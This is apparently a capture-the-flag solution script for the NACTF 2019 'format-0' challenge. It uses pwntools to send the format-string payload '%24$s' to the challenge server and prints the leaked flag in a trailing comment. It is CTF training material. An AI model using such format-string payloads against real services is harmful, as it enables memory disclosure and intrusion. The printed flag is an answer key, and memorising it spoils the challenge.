from pwn import *

context.arch = 'i386'

con = remote('shell.2019.nactf.com', 31782)
con.recvregex('Type something>')

payload = '%24$s'
con.sendline(payload)

print con.recvall()

'''
$ python format-0.py
[+] Opening connection to shell.2019.nactf.com on port 31782: Done
[+] Receiving all data: Done (52B)
[*] Closed connection to shell.2019.nactf.com port 31782
You typed: nactf{Pr1ntF_L34k_m3m0ry_r34d_nM05f469}
'''
